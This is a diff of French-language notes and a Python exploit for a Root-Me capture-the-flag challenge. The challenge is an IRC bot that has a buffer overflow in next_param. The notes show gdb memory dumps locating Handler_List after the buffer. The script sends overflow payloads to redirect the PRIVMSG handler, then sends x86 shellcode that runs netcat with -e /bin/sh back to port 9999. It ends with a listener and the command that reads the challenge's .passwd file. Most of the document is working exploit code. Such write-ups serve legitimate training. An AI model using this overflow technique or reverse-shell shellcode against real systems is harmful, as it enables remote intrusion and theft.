@@ -5,75 +5,102 @@ mkdir yopla
 cd yopla
 
 ##Pour le fichier global.h, on change NICK
-#define NICK    "ELIS"
+#define NICK    "NICK"
 
-On trouve ladersse du buff
-puis on voit que handler list est stocke un peu apres, apres un certain nombre de handlers
-
-Avec notre overflow, on va vouloir reecrire sur ce nmbr de handlers et sur handler list
-
-un hndler correspond a une CMD
-
-on veut reecrire sur une CMD et le handler correspondant
-
-les handlers sont appele dans handle msg
-dans init_handler il y a la CMD 376.
-Cest celle quon va reecrire
-
-Les autres handlers pas modifier et qui seront appeles ne feront donc pas segfaulter la boucle et le prgm continuera
-
-On ne peut pas stocker notre overflow dans buf aui est trop petit
-On va donc le stocker dans la struct msg que lon apellera dans le buf
-
-next_param est appele dans privmsg_handle
-Le message doit commencer par ! et il faut utiliser une commmande reconnue par le bot
+##On va vouloir overflow dans la fonction next_param
 
 
+##dans la memoire, le buffer est suivit par la struct Handler_list
 
-##On veut segfault next_param
+nm ch31
+[...]
+0804b120 b buff.4746
+[...]
+
+gdb ch31
+x/100xw 0x0804b120
+
+0x804b140 <buff.4746+32>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b150:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b160 <Handler_List>:	0x00000000	0x00000000	0x00000000	0x00000000
+
+##nous allons lecraser pour que lorsquon lui envoie la cmd PRIVMSG, lhandler pointe sur ladresse du buffer et pour qu'au prochain message prive, il execute ce quil y a dans le buffer
+
+struct Handler Handler_List[MAX_HANDLER];
+void init_handlers(void)
+{
+	add_handler("376", end_list_handle);
+	add_handler("JOIN", join_handle);
+	add_handler("PRIVMSG", privmsg_handle);
+	add_handler("PING", ping_handle);
+}
 
 
-##On veut ecraser handler_list
+##Pour cela, creer un scrypt python
+
+[
+
+
+#!/usr/bin/env python
+
+import socket
+import struct
+import telnetlib
+import time
+#import irclib
+
+HOST = "irc.root-me.org"
+PORT = 6667
+NICK = "NIC"
+CHANNEL = "#root-me_challenge"
+TARGET = "Pown3dBot"
+#TARGET = "NIC2"
+SHELL="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x30\x30\x30\x2e\x30\x30\x30\x2e\x30\x30\x31\x23\x39\x39\x39\x39\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x46\x46\x46\x46"
+
+def sendMessage(target , msg):
+  s.send("PRIVMSG "+ target +" :"+ msg +"\r\n")
+
+#on se connecte au bot
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+
+
+s.send("NICK %s\r\n" % NICK)
+s.send("USER "+ NICK +" "+ NICK +" "+ NICK +" :NIC2\r\n")
+time.sleep(1)
+s.send("JOIN "+ CHANNEL +"\r\n")
+
+time.sleep(4)
+print s.recv(1024)
+
+#exploit
+#on ecrase la struct handler_list et on le fait pointer sur le buffer
+p1 = "!" + "N" * 139 +  "\x99\xf7\xff\xbf" + "PRIVMSG\0"
+sendMessage(TARGET, p1);
+time.sleep(2)
+print s.recv(1024)
+
+#on envoie un deuxieme PRIVMSG afin que lhandler appelle ce qui est contenu dans la variable buffer
+p2 = "!" + "I" * 103 + "PRIVMSG\0"
+sendMessage(TARGET, p2);
+time.sleep(2)
+print s.recv(1024)
+
+#on accede au remote shell
+sendMessage(TARGET, SHELL);
+time.sleep(2)
+print s.recv(1024)
 
 
 
 
+]
 
 
+nc -lvp 9999
+./script.py
+ cd challenge/app-systeme/ch31/
+ cat .passwd;
 
 
-
-
-mkdir /tmp/jm; cd /tmp/jm; cp ~/* .
-
-global.h :
-#define NICK    "Pown3dBot" => #define NICK    "JMB2"
-
-fonction qui peuvent segfault :
-	- next_param
-		- get_nick
-
-		nm ch31
-			[...]
-				0804b120 b buff.4746
-					[...]
-
-					gdb ch31
-						x/100xw 0x0804b120
-
-							0x804b140 <buff.4746+32>:	0x00000000	0x00000000	0x00000000	0x00000000
-								0x804b150:	0x00000000	0x00000000	0x00000000	0x00000000
-									0x804b160 <Handler_List>:	0x00000000	0x00000000	0x00000000	0x00000000
-									Je vais donc ecraser Handler_List
-										struct Handler Handler_List[MAX_HANDLER];
-											void init_handlers(void)
-												{
-															add_handler("376", end_list_handle);
-																	add_handler("JOIN", join_handle);
-																			add_handler("PRIVMSG", privmsg_handle);
-																					add_handler("PING", ping_handle);
-																						}
-
-																						nc -lvp 9999
-																						./rootroot.py
-																						cd challenge/app-systeme/ch31/; cat .passwd;
